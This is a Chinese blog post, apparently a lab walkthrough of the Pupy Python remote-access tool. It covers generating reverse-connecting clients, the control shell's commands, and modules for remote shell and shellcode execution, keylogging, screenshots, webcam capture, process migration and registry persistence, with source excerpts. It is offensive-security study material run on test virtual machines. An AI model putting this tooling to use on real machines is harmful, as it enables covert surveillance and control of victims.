---
title:  "Python远控Pupy使用帮助"
date:   2015-10-08 19:00:00
---

# 0x00 前言

---

菜鸡我总结一下一个python远控——pupy的使用帮助，github地址为：[https://github.com/n1nj4sec/pupy](https://github.com/n1nj4sec/pupy)，作者对其能够实现的功能写得很清除。其主要依赖rpyc来实现远程控制，并且使用Python作为脚本语言从而实现跨平台操作，再使用PupyServer和PupyCmd的继承，实现控制端的主要功能，各个模块均继承自PupyModules来通过run命令实现对应模块功能。

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/dir1.png)

client目录存放客户端（受控端）脚本以及一些源文件，docs则是说明文档相关，pupy则是服务端（控制端）相关脚本

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/dir2.png)

cypto中是一些方向ssl连接需要的证书文件，modules中是一些run命令运行的模块脚本，packages中是不同平台上实现模块功能的根本脚本，payload_templates则是生成客户端exe及dll的模板，pupylib中是服务端核心功能中几个重要的类文件，pupy.conf是配置文件设置服务地址端口，颜色显示及命令别名，pupygen.py生成Windows平台上的exe或dll客户端，pupysh.py则是pypushell主程序

# 0x01 准备

---

## 1.生成Windows上的客户端

github的ReadMe里面都写得很清楚，这里我开了3个虚拟机，服务端（主控端）的Kali2（172.16.162.130），客户端（受控端）的xp（172.16.162.133）和Kali（172.16.162.129），穷屌我这里就不测试Mac了

对于Windows主要是通过pupy文件夹下的pupygen.py生成对应x86或x64平台的exe或dll（用于反向注射）

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/1.png)

host为回连主机地址，-p指定回连端口，-t指定生成文件类型，-o指定生成文件名,然后生成对应二进制文件

{% highlight python %}
i=binary.find("<default_connect_back_host>:<default_connect_back_port>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", i+1)
...
new_host="%s:%s\x00\x00\x00\x00"%(host,ip)
...
binary=binary[0:offsets[0]]+new_host+binary[offsets[0]+len(new_host):]
{% endhighlight %}

找到二进制文件中对应的标志位，再将host及ip写入

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/2.png)

## 2.生成Kali上的客户端

Windows平台下如果有Python，rpyc，pupy也是类似的

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/3.png)

{% highlight python %}
rhost,rport=None,None
        tab=HOST.rsplit(":",1)
        rhost=tab[0]
        if len(tab)==2:
            rport=int(tab[1])
        else:
            rport=443
        print "connecting to %s:%s"%(rhost,rport)
        conn=rpyc.ssl_connect(rhost, rport, service = ReverseSlaveService)
{% endhighlight %}

默认是443端口并以冒号分割，再使用rpyc模块进行ssl连接到控制端，循环等待并打印出连接信息

# 0x02 开始

---

直接运行pupy/pupy/pupysh.py便可以启用客户端（pupyshell），自然使用help或?查看帮助

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/4.png)

在pupysh.py中主要是导入pupylib.PupyServer和pupylib.PupyCmd，分别实例化，并使用PupyCmd继承cmd.Cmd中的cmdloop()方法，来解析并执行命令

{% highlight python %}
...
pupyServer=pupylib.PupyServer.PupyServer()
...
pupyServer.start()
    pcmd=pupylib.PupyCmd.PupyCmd(pupyServer)
    while True:
        try:
            pcmd.cmdloop()
{% endhighlight %}

有趣的是在有中文版xp的受控端进入后，使用clients或sessions命令时均会出现如下错误

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/error.png)

看是解码错误，便在pupylib/PupyCmd.py中在导入模块后再添加以下代码就okay啦

{% highlight python %}
if sys.getdefaultencoding()!='gbk':
  reload(sys)
  sys.setdefaultencoding('gbk')
{% endhighlight %}

## clients ##

{% highlight python %}
def do_clients(self, arg):
        """ alias for sessions """
        self.do_sessions(arg)
{% endhighlight %}

可以看出来是和sessions的功能一样

## sessions ##

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/5.png)

-i是设置过滤器（也可用于其他命令），-g重置过滤器，-l列出所有存活会话，-k杀死选择会话

会话则会列举出"id", "user", "hostname", "platform", "release", "os_arch", "address"这些值

## exit ##

{% highlight python %}
def do_exit(self, arg):
        """ Quit Pupy Shell """
        sys.exit()
{% endhighlight %}

直接退出，没什么好说的

## jobs ##

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/6.png)

-h帮助，-l列举出所有任务，-k后接job_id杀死该job，-p后接job_id打印出该job输出

## python ##

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/7.png)

运行本地的Python环境，用于调试

## read ##

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/8.png)

{% highlight python %}
def do_read(self, arg):
    """ execute a list of commands from a file """
    try:
        if not arg:
            self.display_error("usage: read <filename>")
            return
        with open(arg,'r') as f:
            self.cmdqueue.extend(f.read().splitlines())
    except Exception as e:
        self.display_error(str(e))
{% endhighlight %}

接受一个文件，并逐行执行命令

# 0x03 run #

---

首先来介绍一下list_moudules和run命令（和msf很类似）

## list_modules

{% highlight python %}
PupyCmd.py:
def do_list_modules(self, arg):
    """ List available modules with a brief description """
    for m,d in self.pupsrv.list_modules():
        self.stdout.write("{:<20}   {}\n".format(m, color(d,'grey')))

PupyServer.py:
def list_modules(self):
    l=[]
    for loader, module_name, is_pkg in pkgutil.iter_modules(modules.__path__):
        module=self.get_module(module_name)
        l.append((module_name,module.__doc__))
    return l
{% endhighlight %}

将modules包中脚本所包含的modules都列举出来，并附加简要说明

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/9.png)

各模块支持的平台如下

* migrate (windows only)
    * inter process architecture injection also works (x86->x64 and x64->x86)
* keylogger (windows only)
* persistence (windows only)
* screenshot (windows only)
* webcam snapshot (windows only)
* command execution
* download
* upload
* socks5 proxy
* local port forwarding
* interactive shell (cmd.exe, /bin/sh, ...)
* interactive python shell
* shellcode exec (thanks to @byt3bl33d3r)

## run

run命令则是直接运行这些模块

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/10.png)

-h帮助，-f设置客户端过滤条件，--bg后台运行，后接模块及其参数

对于过滤条件的设置，可以直接指定clients输出id值，或者是其他冒号分割的名值对

在pupy.conf文件中，主命令info，ps，migrate，exec，pyexe，kill分别具有run modules功能中的别名get_info，ps，migrate，shell_exec，pyexe，process_kill

下面介绍一下相关模块的功能

### interactive_shell

交互shell所有平台均支持，这里我把显示Windows的编码换成了cp936，可以良好显示中文啦

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/11.png)

### shell_exec

直接执行远程shell命令，Windows上的编码还是换成cp936

{% highlight python %}
shell_exec.py:
...
if self.client.is_windows():
    try:
        res=res.decode('cp936')#437')
{% endhighlight %}

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/16.png)

### pyshell

开启远程Python交互shell

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/17.png)

### pyexec

直接在远程系统上执行Python代码，--file接文件或-c接代码

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/18.png)

### download

通过使用`from rpyc.utils.classic import download`，实现从远程系统上下载文件

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/12.png)

{% highlight python %}
remote_file=self.client.conn.modules['os.path'].expandvars(args.remote_file)
rep=os.path.join("data","downloads",self.client.short_name())
if not args.local_file:
    try:
        os.makedirs(rep)
{% endhighlight %}

如果未指明本地路径，则存储在/data/downloads中

### upload

通过使用`from rpyc.utils.classic import upload`实现上传，功能与download相仿

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/13.png)

### search

在指定path中搜索string

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/search.png)

### get_info

获取受控端平台信息

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/14.png)

###  exit

退出受控端并确认

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/15.png)

### ps

列出进程，默认给出'username', 'pid', 'arch', 'exe'的信息，-a则给出'username', 'pid', 'arch', 'name', 'exe', 'cmdline', 'status'

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/19.png)

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/20.png)

### getprivs

获取SeDebug权限

### process_kill

杀死pid进程

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/21.png)

### socks5proxy

开启socks5代理，-p指定端口

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/22.png)

### portfwd

本地或远程端口转发，远程端口转发还未开发，本地端口转发则是`-L [<LOCAL_ADDR>]:<LOCAL_PORT>:<REMOTE_ADDR>:<REMOTE_PORT>`，-k则kill掉对应的id转发（id依次增一）

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/portfwd.png)

### shell_exec

直接执行shellcode

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/shellcode_exec.png)

### keylogger

键盘记录

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/23.png)

### screenshot

截屏，-e遍历屏幕，-s SCREEN指定特定的屏幕（穷吊没验证），-v截屏后直接预览

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/24.png)

### webcamsnap

捕捉网络摄像头，-d DEVICE指定特定的设备（同没验证），-v捕捉后直接预览

### migrate

迁移至其他进程（由pid指定）

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/migrate.png)

### persistence

{% highlight python %}
persistence.py:
... 
remote_path=self.client.conn.modules['os.path'].expandvars("%TEMP%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
{% endhighlight %}

权限维持，写入到注册表中（对应临时目录下的随机命令exe），并开机启动

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/persistence.png)

### msgbox

最后作者示范了一下如何编写这个msgbox模块

首先新建一个pupy/packages/windows/all/pupwinutils/msgbox.py ，再写一个你想导入受控端的类或函数

{% highlight python %}
import ctypes
import threading    

def MessageBox(text, title):
    t=threading.Thread(target=ctypes.windll.user32.MessageBoxA, args=(None, text, title, 0))
    t.daemon=True
    t.start()
{% endhighlight %}

然后再创建一个模块来导入我们包和调用我们的函数

{% highlight python %}
class MsgBoxPopup(PupyModule):
    """ Pop up a custom message box """    

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="msgbox", description=self.__doc__)
        self.arg_parser.add_argument('--title', help='msgbox title')
        self.arg_parser.add_argument('text', help='text to print in the msgbox :)')    

    @windows_only
    def is_compatible(self):
        pass    

    def run(self, args):
        self.client.load_package("pupwinutils.msgbox")
        self.client.conn.modules['pupwinutils.msgbox'].MessageBox(args.text, args.title)
        self.log("message box popped !")
{% endhighlight %}

title指定标题，再接内容

![](http://ojyzyrhpd.bkt.clouddn.com/20151008/msg.png)



